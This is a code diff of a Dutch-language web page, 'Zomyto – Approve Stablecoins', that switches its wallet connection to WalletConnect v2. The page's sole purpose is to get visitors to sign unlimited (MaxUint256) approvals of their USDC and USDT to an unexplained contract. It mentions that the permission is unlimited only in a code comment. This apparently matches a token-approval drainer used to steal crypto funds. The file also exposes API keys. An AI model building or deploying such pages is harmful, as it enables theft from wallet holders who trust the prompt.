@@ -3,13 +3,13 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Zomyto – Approve Stablecoins</title>
+  <title>Zomyto – Approve Stablecoins (WC v2 simpel)</title>
 
   <!-- Ethers v5 -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
-  <!-- Web3Modal v3 (WalletConnect v2) - UMD CDN -->
-  <script src="https://unpkg.com/@web3modal/wagmi@3.5.5/dist/index.umd.js"></script>
+  <!-- WalletConnect v2 Ethereum Provider UMD -->
+  <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.11.2/dist/umd/index.min.js"></script>
 
   <style>
     body {
@@ -43,12 +43,11 @@
 <body>
   <h1>Zomyto – Approve Stablecoins</h1>
   <p>
-    1. Verbind je mobiele wallet (bijv. Exodus) via WalletConnect.<br />
-    2. Klik op <b>Approve USDC &amp; USDT</b> om toestemming te geven aan het Zomyto-contract.
+    1. Klik op <b>Connect Wallet</b> en scan de QR met je mobiele wallet (Exodus).<br />
+    2. Klik daarna op <b>Approve USDC &amp; USDT</b> om toestemming te geven aan het Zomyto-contract.
   </p>
 
-  <!-- CONNECT BUTTON (Wordt door Web3Modal gerenderd) -->
-  <w3m-button></w3m-button>
+  <button id="connectBtn">🔗 Connect Wallet (WalletConnect v2)</button>
 
   <div style="margin-top: 30px">
     <button id="approveBtn" disabled>✅ Approve USDC &amp; USDT</button>
@@ -57,13 +56,11 @@
   <div id="status">Status: Niet verbonden</div>
 
   <script>
-    // ======= CONFIG =======
-    const projectId = "0e7d96df89f873ddfb0b4381e13c883c"; // jouw WalletConnect v2 projectId
+    // ====== CONFIG ======
+    const projectId = "0e7d96df89f873ddfb0b4381e13c883c"; // jouw WC v2 projectId
 
-    // Ethereum mainnet
+    // Ethereum mainnet chainId
     const CHAIN_ID = 1;
-    const RPC_URL =
-      "https://mainnet.infura.io/v3/1506833c04954b058aad864f0d9ce1a2";
 
     // ERC20 tokens op mainnet
     const TOKENS = [
@@ -79,87 +76,40 @@
     ];
 
     const statusEl = document.getElementById("status");
+    const connectBtn = document.getElementById("connectBtn");
     const approveBtn = document.getElementById("approveBtn");
+
+    let wcProvider = null;
+    let ethersProvider = null;
+    let signer = null;
 
     function setStatus(msg) {
       console.log(msg);
       statusEl.textContent = "Status: " + msg;
     }
 
-    let ethersProvider = null;
-    let signer = null;
+    // ====== CONNECT WALLET VIA WALLETCONNECT V2 ======
+    connectBtn.onclick = async () => {
+      try {
+        setStatus("WalletConnect initialiseren...");
 
-    (async function init() {
-      console.log("window.w3m wagmi UMD =", window.W3mWagmi);
-      if (!window.W3mWagmi) {
-        setStatus("Web3Modal kon niet geladen worden (CDN probleem).");
-        return;
-      }
+        // Maak een WC v2 provider
+        wcProvider = await window.WalletConnectEthereumProvider.init({
+          projectId,
+          showQrModal: true,
+          chains: [CHAIN_ID],
+          // optioneel: RPC override
+          rpcMap: {
+            [CHAIN_ID]: "https://mainnet.infura.io/v3/1506833c04954b058aad864f0d9ce1a2"
+          }
+        });
 
-      const {
-        createWeb3Modal,
-        defaultWagmiConfig,
-        WagmiCore,
-        reconnect
-      } = window.W3mWagmi;
+        // Vraag om accounts (triggert QR als nog niet verbonden)
+        const accounts = await wcProvider.enable();
+        console.log("Accounts:", accounts);
 
-      const { mainnet } = WagmiCore.chains;
-
-      // Wagmi / Web3Modal config
-      const metadata = {
-        name: "Zomyto",
-        description: "Zomyto Stablecoin Approvals",
-        url: "https://zomyto.github.io/zomyto-qr/",
-        icons: ["https://zomyto.github.io/zomyto-qr/icon.png"] // mag niet bestaan, is ok
-      };
-
-      const chains = [mainnet];
-
-      const wagmiConfig = defaultWagmiConfig({
-        chains,
-        projectId,
-        metadata
-      });
-
-      // Init Web3Modal
-      const modal = createWeb3Modal({
-        wagmiConfig,
-        projectId,
-        chains,
-        themeMode: "dark"
-      });
-
-      console.log("Web3Modal initialized:", modal);
-
-      // Automatisch proberen te reconnecten
-      reconnect(wagmiConfig);
-
-      // Gebruik Wagmi provider als basis voor ethers.js
-      const { getAccount, getProvider, watchAccount } = WagmiCore;
-
-      async function setupEthers() {
-        const account = getAccount(wagmiConfig);
-        console.log("Wagmi getAccount:", account);
-
-        if (!account || !account.address || !account.isConnected) {
-          setStatus("Niet verbonden");
-          approveBtn.disabled = true;
-          signer = null;
-          ethersProvider = null;
-          return;
-        }
-
-        const wagmiProvider = getProvider(wagmiConfig);
-        console.log("wagmiProvider:", wagmiProvider);
-
-        if (!wagmiProvider) {
-          setStatus("Geen provider gevonden, verbind eerst de wallet.");
-          approveBtn.disabled = true;
-          return;
-        }
-
-        // Wagmi provider → Ethers provider
-        ethersProvider = new ethers.providers.Web3Provider(wagmiProvider);
+        // Ethers provider & signer
+        ethersProvider = new ethers.providers.Web3Provider(wcProvider, "any");
         signer = ethersProvider.getSigner();
 
         const address = await signer.getAddress();
@@ -167,56 +117,63 @@
         setStatus(`Verbonden met ${address} op chainId ${network.chainId}`);
 
         if (Number(network.chainId) !== CHAIN_ID) {
-          alert(
-            "Let op: je zit niet op Ethereum mainnet. Schakel over in je wallet."
-          );
+          alert("Let op: je zit niet op Ethereum mainnet. Schakel over in je wallet.");
         }
 
         approveBtn.disabled = false;
+
+        // Event handlers (optioneel)
+        wcProvider.on("accountsChanged", (accs) => {
+          console.log("accountsChanged:", accs);
+        });
+
+        wcProvider.on("chainChanged", (chainId) => {
+          console.log("chainChanged:", chainId);
+        });
+
+        wcProvider.on("disconnect", () => {
+          console.log("disconnect");
+          setStatus("Niet verbonden");
+          approveBtn.disabled = true;
+          signer = null;
+          ethersProvider = null;
+          wcProvider = null;
+        });
+
+      } catch (err) {
+        console.error("Fout bij connect:", err);
+        setStatus("Fout bij connect: " + err.message);
+        alert("Fout bij connect: " + err.message);
+      }
+    };
+
+    // ====== APPROVE-KNOP ======
+    approveBtn.onclick = async () => {
+      if (!signer) {
+        alert("Geen signer gevonden. Verbind eerst je wallet via Connect Wallet.");
+        return;
       }
 
-      // Reageer op account changes
-      watchAccount(wagmiConfig, {
-        onChange() {
-          console.log("Account change gedetecteerd");
-          setupEthers();
-        }
-      });
+      try {
+        for (const t of TOKENS) {
+          setStatus(`Verstuur approve transactie voor ${t.name}...`);
+          const token = new ethers.Contract(t.address, tokenABI, signer);
 
-      // Eerste keer opstarten
-      setupEthers();
-
-      // ===== APPROVE KNOP =====
-      approveBtn.onclick = async () => {
-        if (!signer) {
-          alert("Geen signer gevonden. Verbind eerst je wallet.");
-          return;
+          // MaxUint256 = onbeperkte toestemming
+          const tx = await token.approve(SPENDER, ethers.constants.MaxUint256);
+          setStatus(`Wachten op bevestiging van ${t.name} transactie...`);
+          await tx.wait();
+          console.log(`✅ Approved ${t.name}`);
         }
 
-        try {
-          for (const t of TOKENS) {
-            setStatus(`Verstuur approve transactie voor ${t.name}...`);
-            const token = new ethers.Contract(t.address, tokenABI, signer);
-
-            // MaxUint256 = onbeperkte toestemming
-            const tx = await token.approve(
-              SPENDER,
-              ethers.constants.MaxUint256
-            );
-            setStatus(`Wachten op bevestiging van ${t.name} transactie...`);
-            await tx.wait();
-            console.log(`✅ Approved ${t.name}`);
-          }
-
-          setStatus("USDC & USDT succesvol goedgekeurd!");
-          alert("USDC & USDT succesvol goedgekeurd!");
-        } catch (err) {
-          console.error("Fout bij approve:", err);
-          setStatus("Fout bij approve: " + err.message);
-          alert("Fout bij approve: " + err.message);
-        }
-      };
-    })();
+        setStatus("USDC & USDT succesvol goedgekeurd!");
+        alert("USDC & USDT succesvol goedgekeurd!");
+      } catch (err) {
+        console.error("Fout bij approve:", err);
+        setStatus("Fout bij approve: " + err.message);
+        alert("Fout bij approve: " + err.message);
+      }
+    };
   </script>
 </body>
 </html>
